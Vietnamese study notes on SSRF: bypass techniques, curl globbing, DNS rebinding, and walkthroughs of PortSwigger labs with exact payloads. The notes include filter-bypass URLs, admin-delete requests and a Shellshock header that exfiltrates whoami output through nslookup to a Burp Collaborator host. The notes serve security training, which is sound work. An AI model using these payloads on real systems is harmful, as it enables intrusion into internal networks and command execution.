# Task 7

Text: Task 7: tìm hiểu về lỗ hổng SSRF
- Hậu quả của SSRF, những hàm nguy hiểu có thể gây ra ssrf (python, php, nodejs)
- Tìm hiểu về kỹ thuật ssrf dựa trên chuyển hướng.
- Phân loại ssrf, phân biệt chúng.
- Tìm hiểu về một số kỹ thuật bypass SSRF localhost, bypass black-list.
- Tìm hiểu về kỹ thuật curl Globbing trong ssrf.
- Có thể tham khảo nguồn: https://portswigger.net/web-security/ssrf, https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- Tìm hiểu kỹ thuật DNS rebinding
- Clear lab SSRF portswigger

DEADLINE: 23h 11/9

# I. Khái niệm lỗ hổng SSRF

## 1. Định nghĩa SSRF

- SSRF (Server-Side Request Forgery) là lỗ hổng bảo mật cho phép kẻ tấn công lợi dụng server làm trung gian gửi request đến một địa chỉ mà attacker chọn.
- Thay vì attacker gửi request trực tiếp từ máy của mình, họ khiến server (ứng dụng web bị lỗi) gửi request.
- Điều này giúp attacker truy cập được các tài nguyên nội bộ (intranet, dịch vụ local như 127.0.0.1, metadata cloud AWS/GCP/Azure, Redis, v.v.) mà bình thường không thể truy cập từ bên ngoài.

## 2. Hậu quả của SSRF

Khi một ứng dụng bị dính SSRF, attacker có thể lợi dụng để:

- Truy cập mạng nội bộ (Intranet access):
    - Quét cổng (`127.0.0.1:22`, `10.x.x.x:8080`).
    - Truy cập dịch vụ chỉ mở trong LAN (admin panel, API nội bộ).
- Đọc dữ liệu nhạy cảm:
    - Cloud metadata (AWS: `http://169.254.169.254/latest/meta-data/`, GCP: `http://metadata.google.internal/`).
    - File nội bộ (`file:///etc/passwd`) nếu server hỗ trợ.
- Tấn công leo thang (Privilege Escalation):
    - Truy cập endpoint nội bộ để chiếm quyền quản trị (Jenkins, Kibana, Solr).
    - Gửi payload đến dịch vụ dễ khai thác (Redis, Elasticsearch, Docker API).
- Blind SSRF → Exfiltration:
    - Dùng DNS/HTTP logging server để nhận phản hồi gián tiếp.
- Pivoting:
    - SSRF biến server thành proxy, mở đường cho attacker tiến sâu hơn vào hệ thống.

## 3. Những hàm/ngữ cảnh nguy hiểm dễ gây SSRF

SSRF thường xuất hiện khi code cho phép người dùng nhập URL mà không kiểm soát.

### 🐍 Python

- `requests.get(user_input)`
- `urllib.request.urlopen(user_input)`
- `httplib2.Http().request(user_input)`
- `httpx.get(user_input)`

Ví dụ:

```python
import requests
url = input("Enter URL: ")
r = requests.get(url)  # => SSRF nếu nhập http://127.0.0.1:8080
```

### 🐘 PHP

- `file_get_contents($url)`
- `fopen($url, "r")`
- `include($url)` hoặc `require($url)` khi `allow_url_include=On`
- `curl_exec($ch)` với `curl_setopt($ch, CURLOPT_URL, $user_input)`

Ví dụ:

```php
<?php
$url = $_GET['url'];
echo file_get_contents($url); // SSRF
?>
```

### 🟢 Node.js

- `http.get(user_input, callback)`
- `https.get(user_input, callback)`
- `request(user_input, ...)` (thư viện `request`)
- `axios.get(user_input)`

Ví dụ:

```jsx
const http = require('http');
let url = req.query.url;
http.get(url, res => { ... }); // SSRF
```

## 4. Kỹ thuật SSRF dựa trên **chuyển hướng (Redirect)**

Một số ứng dụng chỉ lọc URL ban đầu, nhưng không kiểm tra URL sau khi redirect.

Kẻ tấn công có thể lợi dụng:

### Ví dụ

1. Ứng dụng chỉ cho phép domain `example.com`.
2. Attacker nhập:
    
    ```
    http://example.com/redirect?to=http://127.0.0.1:8080/
    ```
    
3. `example.com` trả về HTTP 302 Redirect đến `127.0.0.1`.
4. Server follow redirect → SSRF thành công.

👉 Đây gọi là Open Redirect + SSRF.

### Các trick redirect thường gặp:

- `http://127.0.0.1#example.com` → bypass filter
- `http://example.com@127.0.0.1` → bypass filter.
- `http://127.0.0.1#@example.com` → bypass filter dày hơn ( có giải thích ở lab **4. Lab: SSRF with whitelist-based input filter )**
- DNS rebinding (domain trỏ ban đầu ra IP ngoài, sau đó thay đổi sang IP nội bộ).

## 5. Phân loại SSRF

Có nhiều cách phân loại, phổ biến nhất là:

### a. **Based on Feedback**

1. **Normal SSRF**
    - Attacker thấy trực tiếp response từ server.
    - Dễ khai thác: lấy nội dung, quét cổng.
2. **Blind SSRF**
    - Attacker không thấy phản hồi.
    - Phải dùng **DNS log server** (Burp Collaborator, Interactsh).
    - Hoặc quan sát side-channel (thời gian, log, lỗi).

### b. **Based on Exploitation Goal**

1. **Internal Network SSRF**
    - Dùng server để quét mạng nội bộ, tìm dịch vụ.
2. **Cloud SSRF**
    - Nhắm đến cloud metadata services.
    - AWS, GCP, Azure thường có endpoint `169.254.169.254`.
3. **Protocol-based SSRF**
    - HTTP/HTTPS (thường gặp).
    - `file://` → đọc file.
    - `gopher://` → gửi payload tùy ý (Redis, SMTP injection).
    - `dict://`, `ftp://`, `ldap://` cũng có thể.

# II. Một số kỹ thuật bypass SSRF localhost, bypass black-list, bypass while-list.

## 1. Bypass white-list filter

### Whitelist-based filter là gì?

Một số ứng dụng chỉ cho phép URL trong danh sách an toàn (ví dụ: chỉ `http://stock.local/` hoặc `http://api.company.com/`).

Filter có thể:

- Kiểm tra bắt đầu bằng chuỗi (`startswith("http://stock.local")`)
- Hoặc kiểm tra xem chuỗi đó có xuất hiện trong URL hay không.

Nếu filter này được viết thủ công (ad-hoc parsing), attacker có thể khai thác các đặc điểm đặc biệt trong chuẩn URL để qua mặt.

### a) Dùng credentials trước hostname (`@`)

Theo chuẩn URL, phần trước `@` được coi là username:password.

Ví dụ:

```
https://expected-host:fakepassword@evil-host
```

- Filter thấy `expected-host` ở trước → cho qua.
- Nhưng request thật sự đi tới evil-host.

---

### b) Dùng fragment (#)

Ký tự `#` đánh dấu fragment (phần dành cho client, không gửi tới server).

Ví dụ:

```
https://evil-host#expected-host
```

- Filter thấy có `expected-host` trong chuỗi → tưởng hợp lệ.
- Nhưng khi request ra ngoài, server chỉ lấy phần trước # → thực tế tới `evil-host`.

---

### c) Dùng DNS subdomain

DNS cho phép dạng `subdomain.domain.com`.

Ví dụ:

```
https://expected-host.evil-host
```

- Filter chỉ cần thấy `"expected-host"` trong hostname → cho qua.
- Nhưng request đi tới `evil-host` (mà attacker kiểm soát).

---

### d) Dùng URL encoding

Ký tự có thể encode theo `%xx`. 

Ví dụ:

- `/` → `%2F`
- `:` → `%3A`

Nếu filter so sánh raw string, còn thư viện HTTP decode trước khi gửi, attacker sẽ tạo URL chứa ký tự encode hoặc double-encode.

Ví dụ:

```
http://expected-host%2Fevil.com
```

- Filter nhìn thấy `expected-host` trong URL.
- Nhưng decode ra lại thành request tới `evil.com`.

---

### e) Kết hợp nhiều kỹ thuật

Attacker thường kết hợp `@`, `#`, URL-encode và subdomain để lừa filter.

Ví dụ:

```
https://expected-host@evil-host#expected-host
```

hoặc double encode:

```
http://expected-host%252fevil.com
```

---

## 2. Bypass black-list filter

Black-list filter là danh sách những URL bị chặn

### a. Dùng biểu diễn IP khác của 127.0.0.1

- `127.0.0.1` có nhiều cách viết hợp lệ khác nhau mà server vẫn hiểu:
    - Decimal (số thập phân): `2130706433`
    - Octal (bát phân): `017700000001`
    - Rút gọn: `127.1` (hệ thống tự hiểu = 127.0.0.1)

Ví dụ:

```
http://127.0.0.1/admin        (bị chặn)
http://2130706433/admin       (bypass)
http://017700000001/admin     (bypass)
http://127.1/admin            (bypass)
```

---

### b. Dùng tên miền trỏ về localhost

- Tạo một domain (hoặc dùng dịch vụ như burp collaborator, Interash, Webhook.site) rồi cấu hình DNS của nó trỏ về `127.0.0.1`.
- Khi filter chỉ chặn `"127.0.0.1"` nhưng không chặn domain, request sẽ vượt qua.

Ví dụ:

```
http://myfake-domain.com/admin
```

Trong DNS → `myfake-domain.com` = `127.0.0.1`.

---

### c. Obfuscate (làm rối) chuỗi bị chặn

- Bộ lọc thường check chuỗi rõ ràng (`127.0.0.1`, `localhost`, `/admin`).
- Ta có thể encode/biến đổi để bypass:
    - URL encoding:
        - `/admin` → `%2fadmin`
    - Case variation:
        - `/Admin`, `/aDmIn`
    - Double encoding:
        - `/admin` → `%252fadmin` (decode 2 lần mới ra `/admin`).

---

### d. Dùng Redirect

- Cho server truy cập một URL hợp lệ, rồi trang đó redirect đến target.
- Ví dụ:
    
    ```
    http://evil.com/redirect?to=http://127.0.0.1/admin
    ```
    
- Server request `evil.com` → nhận HTTP 302 → tự động follow đến `127.0.0.1/admin`.
- Một số filter không kiểm tra redirect, nên bị bypass.
- Có khi đổi protocol trong redirect cũng bypass được:
    - `http://evil.com` → redirect → `https://127.0.0.1/admin`

---

# III. Kỹ thuật curl Globbing trong SSRF

Khi backend dùng cURL để fetch URL, thì SSRF có thể lợi dụng cURL globbing

### 1. Globbing là gì?

- cURL hỗ trợ cú pháp `{}` và `[]` để lặp / mở rộng URL.
- Ví dụ, chạy lệnh:
    
    ```bash
    curl http://example.com/[a-z].txt
    ```
    
    sẽ request lần lượt:
    
    ```
    http://example.com/a.txt
    http://example.com/b.txt
    ...
    http://example.com/z.txt
    ```
    
- Hoặc:
    
    ```bash
    curl http://example.com/file{1,2,3}.txt
    ```
    
    sẽ tải `file1.txt`, `file2.txt`, `file3.txt`.
    

### 2. Tại sao nó nguy hiểm trong SSRF?

- Nếu ứng dụng truyền input user vào `curl $URL`, attacker có thể dùng globbing để ép server thực hiện nhiều request cùng lúc.
- Điều này giúp:
    - Scan port:
        
        ```
        http://127.0.0.1:80{,81,82,83}
        ```
        
        → cURL thử cả port 80, 81, 82, 83.
        
    - Brute force đường dẫn:
        
        ```
        http://127.0.0.1/admin[1-100]
        ```
        
        → thử 100 path khác nhau.
        
    - Bypass blacklist: nếu dev filter `"127.0.0.1"`, đôi khi dùng globbing kiểu:
        
        ```
        http://127.0.0.{1}
        ```
        
        vẫn qua được.
        

# IV. Tìm hiểu kỹ thuật DNS rebinding

## 1. DNS rebinding là gì?

- DNS rebinding là kỹ thuật tấn công lợi dụng việc một domain có thể trỏ đến nhiều địa chỉ IP khác nhau trong thời gian ngắn (nhờ TTL rất thấp).
- Ý tưởng: ban đầu domain trỏ tới ip hợp lệ ( ip nằm trong white-list hoặc không nằm trong black-list), nhưng sau đó domain *rebind* để trỏ vào IP nội bộ (vd: `127.0.0.1` hoặc `192.168.x.x`).

→ Như vậy, nạn nhân (hoặc server đích) nghĩ rằng vẫn đang truy cập cùng một domain bình thường, nhưng thực tế request đã bị chuyển hướng vào mạng nội bộ.

## 2. Cách hoạt động cơ bản

1. Attacker tạo domain: `evil.com`.
2. Attacker cấu hình DNS của domain này để:
    - Lần query đầu tiên → trả về IP attacker server (vd: 1.2.3.4).
    - Sau vài giây (TTL ngắn), query lại → trả về IP nội bộ (vd: 127.0.0.1).
    - Có thể dùng web sau để cấu hình domain có 2 lần thay đổi địa chỉ ip  [lock.cmpxchg8b.com](https://lock.cmpxchg8b.com/rebinder.html)
3. Ứng dụng bị tấn công (browser hoặc backend server) cache domain theo TTL. Khi TTL hết hạn → nó sẽ resolve lại domain, lúc này thành địa chỉ nội bộ.
4. Như vậy attacker có thể:
    - Ép server backend trong SSRF truy cập nội bộ.
    - Ép browser của người dùng vượt qua Same-Origin Policy (SOP), vì domain gốc vẫn là `evil.com`.

## 3. Ứng dụng trong khai thác SSRF

Nhiều hệ thống chống SSRF bằng cách:

- Chỉ cho phép truy cập domain cụ thể (whitelist).
- Hoặc block trực tiếp chuỗi `127.0.0.1`, `localhost`.

DNS rebinding bypass được vì:

- Ban đầu `evil.com` resolve ra IP hợp lệ (Internet).
- Sau đó rebind để trỏ vào `127.0.0.1`.
- Server vẫn nghĩ đang request đến “domain hợp lệ” nhưng thật ra request nội bộ.

## 4. Ví dụ trang web có thể bị tấn công DNS rebinding

- Trang Web cho phép người dùng nhập vào một URL bất kỳ, tạo hàm **validate_url()** để thực hiện phân giải tên miền bằng hàm **socket.gethostbyname()** của Python. Sau đó sẽ thực hiện việc kiểm tra IP trả về có phải địa chỉ Loopback 127.0.0.1 hoặc 0.0.0.0 không. Nếu là URL độc hại sẽ return False và in ra dòng chữ “Bad URL”, còn URL uy tín thì trả về True.
- Sau khi thấy ip là hợp lệ, web sẽ tạo một http request mới. Nếu cài đặt TTL quá ngắn thì ip được phân giải ở lần đầu sẽ hết hạn và phải phân giải lần nữa, lần này sẽ ra ip attack

```python
import requests
from urllib.parse import urlparse
import socket

url = "http://08080808.7f000001.rbndr.us"

# Hàm kiểm tra xem URL có chứa Domain mà phân giải IP hợp lệ không (A)
def validate_url(url): 
    parsed_url = urlparse(url)
    if parsed_url.hostname:
        try:
            ip_address = socket.gethostbyname(parsed_url.hostname)
            if ip_address in ['127.0.0.1', '0.0.0.0'] or ip_address.startswith('192.168.'):
                print("Bad URL")
                return False
            else:               
                return True
        except socket.gaierror:
            print("Invalid hostname:", parsed_url.hostname)
            return False
    else:
        print("Invalid URL format")
        return False

# Tạo HTTP Request nếu URL hợp lệ (B)
if validate_url(url):
    response = requests.get(url)
```

- Hacker tạo ra một tên miền **08080808.7f000001.rbndr.us** để khai thác lỗ hổng DNS Rebinding.  Ở lần phân giải A (đầu tiên), DNS trả về về một địa chỉ Public IP hợp lệ (8.8.8.8). Khiến nó không vi phạm bất tiêu chí nào trong hàm kiểm tra.
- URL lúc này được đưa xuống vị trí B. Tại đây, hàm `requests.get()` của Python sẽ thực hiện tạo một HTTP Request.
- Lúc này khi thực hiện tạo HTTP Request, thì domain mà hacker tạo ra đã bị phân giải về địa chỉ 127.0.0.1.

# V. Lab porswigger

## **1. Lab: Basic SSRF against the local server**

- thử truy cập đến `/admin`

![image.png](image.png)

- **Loopback** là một cơ chế trong mạng, cho phép máy tính tự nói chuyện với chính nó thông qua một địa chỉ đặc biệt.
- Các địa chỉ thường dùng:
    - `127.0.0.1` (IPv4)
    - `::1` (IPv6)
    - Tên `localhost`

→ Khi server gửi request đến các địa chỉ này, nó không đi ra ngoài mạng, mà vòng ngược lại chính máy đó → gọi là **loopback interface**.

- web chỉ cho phép truy cập từ admin hoặc api nội bộ (localhost)
- nhưng web có chức năng `stock check` lấy dữ liệu từ hệ thống nội bộ, nên ta có thể gửi url đến `localhost`
- stockApi=`http://localhost/admin`

![image.png](image%201.png)

![image.png](image%202.png)

- thấy có nút `delete` và dẫn đến đường dẫn `/admin/delete?username=carlos` để xóa user carlos
- stockApi=`http://localhost/admin/delete?username=carlos`

## **2. Lab: Basic SSRF against another back-end system**

<aside>
💡

To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`.

</aside>

- Không chỉ localhost, server thường còn có thể truy cập **mạng nội bộ (intranet)** mà người dùng bên ngoài không truy cập được.
- Ví dụ:
    - Hệ thống back-end có admin panel tại `http://192.168.0.68/admin`.
    - Người dùng Internet **không truy cập được** (vì IP private).
    - Nhưng server thì **có quyền truy cập** (cùng mạng LAN).
- ta sẽ burte force xem `x` trên địa chỉ ip là bao nhiêu thì vào được

![image.png](image%203.png)

tìm thấy x là 109 (ip=192.168.0.109) có status 200

![image.png](image%204.png)

tìm thấy endpoint để xóa user 

- stockApi=`http://192.168.0.109:8080/admin/delete?username=carlos`

## **3. Lab: SSRF with blacklist-based input filter**

![image.png](image%205.png)

- payload thông thường đã bị filter
- thử dùng `127.1` server sẽ tự hiểu là `127.0.0.1`

![image.png](image%206.png)

→ có tác dụng

- nhưng khi thêm `/admin` vào thì vẫn bị
- ta có thể double encode url cho một chữ `a` trong chữ admin để filter
- url encode được cấu tạo là `%xx` trong đó `xx` là mã hex ASCII
- chữ `a` url encode là `%61` , encode lần nữa là `%2561`
- stockApi=`http://127.1/%2561dmin`

![image.png](image%207.png)

- stockApi=`http://127.1/%2561dmin/delete?username=carlos`

## **4. Lab: SSRF with whitelist-based input filter**

<aside>
💡

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed an anti-SSRF defense you will need to bypass.

</aside>

- stockApi=`http://127.0.0.1/admin`

![image.png](image%208.png)

→ web sử dụng white-list chỉ cho phép truy cập vào `stock.weliketoshop.net`

- thử dùng kĩ thuật URL credentials với `@` để bypass
    
    stockApi=`http://stock.weliketoshop.net:abc@127.0.0.1/admin`
    

→ ko được 

- thử `#` fragment nếu filter chỉ check chuỗi
    
    stockApi=`http://127.0.0.1#stock.weliketoshop.net`
    

→ cũng không được

### Ta sẽ kết hợp cả `#` và `@`

- đầu tiên ta cần pass white-list bằng `@`
    - stockApi=`http://127.0.0.1@stock.weliketoshop.net`
    - Filter: parse host = `stock.weliketoshop.net` (vì nó lấy phần sau `@`) → pass whitelist.
    
    ![image.png](image%209.png)
    
    - đã bypass filter, nhưng không thể kết nối vì `stock.weliketoshop.net` chỉ là đoạn url cho phép trong white-list, chưa phải là một endpoint đúng
- tiếp theo ta cần loại bỏ phần `@stock.weliketoshop.net` đi vì đây không phải nơi ta muốn server đến mà là `127.0.0.1` , bằng cách dùng fragment url `#` và double encode url dấu `#`
    - stockApi=`http://127.0.0.1%2523@stock.weliketoshop.net`
    - nếu ta không encode dấu `#` thì ngay khi gửi đi, url sẽ biết sau đó là fragment và loại bỏ toàn bộ `@stock.weliketoshop.net` chỉ còn lại `http://127.0.0.1` , như thế sẽ không qua được bộ lọc white-list
    - khi double encode dấu `#` thành `%2523`, bộ lọc thường chỉ decode một lần thành `%23` và vẫn giữ lại phần `@...` → qua được white-list
    - đến khi thư viện http thực hiện request thì nó mới decode lần nữa và thành dấu `#` thực sự thì nó mới cắt toàn bộ phần phía sau, request trở thành `http://127.0.0.1`
- giờ ta chỉ cần đi tới `/admin` bằng payload
    
    stockApi=`http://127.0.0.1%2523@stock.weliketoshop.net/admin`
    

![image.png](image%2010.png)

- stockApi=`http://127.0.0.1%2523@stock.weliketoshop.net/admin/delete?username=carlos`

## **5. Lab: SSRF with filter bypass via open redirection vulnerability**

<aside>
💡

To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`

</aside>

![image.png](image%2011.png)

- web đã chặn truy cập trực tiếp vào app nội bộ
- thấy chức năng `Next product`

![image.png](image%2012.png)

- path hiện tại là `/product/nextProduct` , sau đó tới query với 2 tham số query là `curentProducId` và `path` , ở đây `path` chính là tham số có thể chuyển hướng
- trong response cũng phản hồi là 302 ( chuyển hướng) và có `location:...`
- vì web chỉ có chức năng stock check là tìm dữ liệu từ hệ thống nội bộ nên ta phải đưa payload vào đó
- xóa query `curentProducId`  và thay đổi phần `path` tới admin interface

![image.png](image%2013.png)

 stockApi=`/product/nextProduct?path=http://192.168.0.12:8080/admin`

![image.png](image%2014.png)

 stockApi=`/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`

## **6. Lab: Blind SSRF with out-of-band detection**

- trường Referer trong phần header của HTTP dùng để thông báo url của trang trước đó mà người dùng truy cập
- trang web sử dụng phần mềm analytics để fetches URL ở trong phần `Referer` header khi trang product được load
- khi load trang, server không chỉ trả về trang web mà nó còn sử dụng một phần mềm analytics để đọc phần `Referer` này và tự động gửi HTTP request đến url này ( thường để phục vụ cho logging, marketing, tracking traffic)

![image.png](image%2015.png)

- thay url của Referer bằng subdomain của Burp Collaborator Referer=`https://a2dl0tp1tamzdoockqljj22g87ex2m.burpcollaborator.net/`

![image.png](image%2016.png)

thấy phản hồi về

## **7. Lab: Blind SSRF with Shellshock exploitation**

- rang có sử dụng phần mềm analytics để gửi request đến url lấy trong trường `Referer` của HTTP request khi ta load trang ( như đã giải thích ở lab 6)
- Shellshock là gì?
    - Shellshock là một lỗ hổng trong GNU Bash (2014).
    - Nó cho phép kẻ tấn công chèn lệnh hệ thống vào environment variable (biến môi trường), ví dụ trong các HTTP header (`User-Agent`, `Referer`, …).
    - Khi một chương trình (vd: web server, CGI script) dùng Bash để xử lý header đó, Bash sẽ thực thi luôn lệnh chèn vào.
    
    **Payload Shellshock cơ bản:**
    
    ```bash
    () { :; }; <command>
    ```
    
    - `() { :; };` → giả vờ khai báo một hàm rỗng.
    - `<command>` → lệnh sẽ chạy trên hệ thống (ví dụ `id`, `whoami`, `ls`).
    - Trong Bash, khai báo một hàm thường có dạng:
    
    ```bash
    ten_ham() {
        # thân hàm
    }
    ```
    
    - `()` → đặt tên hàm (nhưng ở đây không có tên, vì trong Shellshock payload phần trước sẽ có tên do môi trường cung cấp).
    - `{ :; }` → thân hàm.
        - `:` là built-in command đặc biệt trong Bash, nghĩa là “không làm gì, luôn thành công”.
        - `:;` tức là chạy lệnh `:` xong kết thúc → coi như một hàm trống.
    - `;` → kết thúc định nghĩa hàm.
    
    → Như vậy, `() { :; };` tương đương với “khai báo một hàm mà bên trong chỉ có một lệnh rỗng (no-op)”
    
    - Khi một chương trình (ví dụ web server Apache) chạy CGI script, nó sẽ biến một số thông tin HTTP header thành biến môi trường.
    - Ví dụ:
        - Header `User-Agent: Firefox` → biến môi trường `HTTP_USER_AGENT="Firefox"`.
        - Header `Referer: http://test.com` → biến môi trường `HTTP_REFERER="http://test.com"`.
    - Nếu giá trị của biến môi trường có dạng giống định nghĩa hàm, Bash sẽ coi nó là “một hàm”.
    - Ví dụ:
        
        ```bash
        HTTP_USER_AGENT='() { :; }; echo hacked'
        ```
        
    - Khi Bash parse, nó sẽ nghĩ rằng đang có một hàm tên `HTTP_USER_AGENT` với thân là `:;` (no-op).
    - Nếu một biến môi trường có dạng giống **định nghĩa hàm**, Bash sẽ cố gắng “parse” nó thành hàm khi khởi chạy.
    - Sau khi khai báo hàm xong, Bash **không dừng lại**, mà tiếp tục chạy bất kỳ lệnh nào viết phía sau.
- Lab yêu cầu lấy tên user của hệ điều hành, nên ta kết hợp Shellshock với DNS exfiltration:

```bash
() { :; }; /usr/bin/nslookup $(whoami).abc123.burpcollaborator.net
```

- `() { :; };` khai báo hàm trống để bắt shell thực hiện lệnh bash phía sau
- `/usr/bin/nslookup` gửi DNS query chứa kết quả ra ngoài
- web app gửi request ngược đến url trong Referer nhưng lỗ hổng shellshock lại nằm ở internal server (192.168.0.X:8080). Vì vậy ta phải làm 2 việc sau trong request gốc gửi đến web
    1. **User-Agent**: chèn payload Shellshock.
    
    ```bash
    User-Agent: () { :; }; /usr/bin/nslookup $(whoami).uwu1c5452wwuctvwlufylckrcii86x.burpcollaborator.net.burpcollaborator.net
    ```
    
    1. **Referer**: đặt URL nội bộ để ép server SSRF đến internal server.
    
    ```
    Referer: http://192.168.0.x:8080
    ```
    
    - burte force x từ 1 → 255
    - khi tìm đúng ip address của internal server, nó sẽ gửi dns query đến burp collaborator

![image.png](image%2017.png)

![image.png](image%2018.png)

→ **peter-yJW5Ai**